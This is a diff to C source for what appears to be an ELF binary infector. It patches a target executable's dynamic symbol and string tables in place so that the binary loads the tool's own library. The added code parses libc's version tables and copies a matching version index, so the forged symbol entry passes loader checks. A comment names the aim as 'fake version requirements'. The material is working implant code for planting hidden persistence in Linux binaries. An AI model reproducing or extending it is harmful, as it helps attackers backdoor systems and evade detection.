@@ -20,6 +20,10 @@ const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu
 void entry(){ // todo: use auxv to get envp, argc, argv
   int fd = open(target, O_RDWR);
   void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
+
+  FILE* file = NULL;
+  char* line = NULL;
+  size_t len = 0;
   
   Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
   unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
@@ -73,12 +77,72 @@ void entry(){ // todo: use auxv to get envp, argc, argv
       strcpy(&str[strlen(sub)+1], self);
       // find dynsym entry and patch to match a normal global symbol
       for(unsigned int i = 0; i < sym_cnt; ++i){
-       if(dyn_sym[i].st_name == (str - dyn_str)){
-         dyn_sym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
-         dyn_sym[i].st_other = STV_DEFAULT;
-         versym[i] = 2; // specify fake version requirements, TODO: add logic to ensure library listing will match sub string
-         break;
-       }
+	if(dyn_sym[i].st_name == (str - dyn_str)){
+	  dyn_sym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
+	  dyn_sym[i].st_other = STV_DEFAULT;
+
+	  // get libc base address from maps
+          unsigned long long libc_base = 0;
+          int libc_fd = 0;
+          file = fopen("/proc/self/maps", "r");
+          while(1){
+            getline(&line, &len, file);
+            if(strstr(line, "libc") != NULL){
+              int offset = strcspn(line, "-");
+              line[offset++] = '\0';
+              libc_base = strtoull(line, NULL, 16);
+              line[strcspn(&line[offset], "\n") + offset] = '\0';
+              libc_fd = open(strstr(&line[offset], "/"), O_RDONLY);
+              break;
+            }
+          }
+          fclose(file);
+
+          void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, libc_fd, 0);
+          close(libc_fd);
+
+          // parse libc elf headers
+          Elf64_Ehdr* libc_ehdr = (Elf64_Ehdr*)libc;
+          Elf64_Shdr* libc_shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
+          Elf64_Shdr* libc_shstrtab = (Elf64_Shdr*)(((libc_ehdr->e_shstrndx * libc_ehdr->e_shentsize) + libc_ehdr->e_shoff) + libc);
+
+          char* libc_strtab = (char*)(libc + libc_shstrtab->sh_offset);
+
+          Elf64_Half* libc_versym = NULL;
+          Elf64_Sym* libc_dynsym = NULL;
+          int libc_sym_cnt = 0;
+          char* libc_dynstr = NULL;
+
+          // find needed sections in libc
+          for(int j = 0; j < libc_ehdr->e_shnum; ++j){
+            if(libc_shdr->sh_type == SHT_GNU_versym){
+              libc_versym = (Elf64_Half*)((char*)libc_ehdr + libc_shdr->sh_offset);
+	      // TODO: do I explicitly need to do the strcmp for .dynsym?? tbd
+            }else if(libc_shdr->sh_type == SHT_DYNSYM && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynsym")){
+              libc_dynsym = (Elf64_Sym*)((char*)libc_ehdr + libc_shdr->sh_offset);
+              libc_sym_cnt = libc_shdr->sh_size / sizeof(Elf64_Sym);
+            }else if(libc_shdr->sh_type == SHT_STRTAB && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynstr")){
+              libc_dynstr = (char*)libc_ehdr + libc_shdr->sh_offset;
+            }
+            libc_shdr++;
+          }
+
+          // find version index for 'sub' in libc
+          unsigned int ver_ndx = VER_NDX_GLOBAL; //default: unversioned
+          for(int j = 0; j < libc_sym_cnt; ++j){
+            if(libc_dynsym[j].st_name != 0 && !strcmp(&libc_dynstr[libc_dynsym[j].st_name], sub)){
+	      // NOTE: VERSYM_HIDDEN should never be set for a chosen 'sub' symbol
+              ver_ndx = libc_versym[j] & 0x7fff;
+              break;
+            }
+          }
+
+          // assign libc 'sub' version index to target
+	  versym[i] = ver_ndx;
+
+          munmap(libc, 0x300000);
+	  break;
+	}
       }
       break;
     }
@@ -123,10 +187,7 @@ void entry(){ // todo: use auxv to get envp, argc, argv
 void __attribute__((constructor)) foo(void){
   void* (*dl_open)(char*, int) = NULL;
 
-  int pid = getpid();
-
-  char maps[64] = { 0 };
-  sprintf(maps, "/proc/%d/maps", pid);
+  char *maps = "/proc/self/maps";
 
   FILE* file = fopen(maps, "r");
   
